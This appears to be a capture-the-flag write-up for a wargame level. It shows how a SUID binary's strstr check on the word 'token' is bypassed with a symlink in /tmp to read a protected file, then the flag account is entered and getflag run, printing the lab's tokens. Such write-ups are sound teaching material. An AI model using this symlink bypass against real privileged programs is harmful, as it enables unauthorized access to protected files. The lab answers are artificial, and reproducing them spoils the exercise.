@@ -1,0 +1,86 @@
+From the level08 account, the goal was to get the real token for the next level by executing getflag with the privileges of flag08.
+
+The home directory contains two files:
+
+level08
+
+token
+
+I checked the permissions:
+
+ls -la
+
+Output:
+
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+The level08 binary is SUID/SGID and owned by flag08, but the token file is only readable by flag08.
+
+I tried to read the token directly:
+
+cat token
+
+Output:
+
+cat: token: Permission denied
+
+I then inspected the binary with strings:
+
+strings level08
+
+Interesting strings found:
+
+%s [file to read]
+token
+You may not access '%s'
+Unable to open %s
+Unable to read fd %d
+strstr
+
+These strings are only clues. They suggest that the program takes a file path as an argument and somehow checks for the word "token", but they do not prove how the check is done.
+
+To confirm exactly what the program does, I used ltrace to trace library calls:
+
+ltrace ./level08 ./token
+
+Output:
+
+strstr("./token", "token")                            = "token"
+printf("You may not access '%s'\n", "./token")        = 35
+exit(1 <unfinished ...>)
+
+This proves that the program uses strstr() to check if the path contains the substring "token", and refuses access if it does.
+
+The program blocks any path containing "token", but this is only a superficial check on the string of the path, not on the actual file or its permissions.
+
+To bypass this check, I created a symbolic link to the token file with a different name:
+
+ln -s /home/user/level08/token /tmp/flag08
+./level08 /tmp/flag08
+
+Output:
+
+quif5eloekouj29ke0vouxean
+
+The program checked the path /tmp/flag08, found no "token" substring, accepted it, opened the symlink which points to the real token file, and read it with the privileges of flag08.
+
+However, the content of the token file was a fake token. The real objective of each level is to execute getflag as the flag user.
+
+I switched to the flag08 account using the fake token as a password:
+
+su flag08
+
+Then I executed getflag:
+
+getflag
+
+Output:
+
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+This is a common security flaw: trying to restrict access by checking the filename instead of using proper filesystem permissions. A symbolic link easily bypasses such a check. Also, placing a fake token in a protected file can mislead attackers who do not verify if they have truly completed the objective.
+
+Token obtained to access the next level:
+
+25749xKZ8L7DkSCwJkT9dyv6f
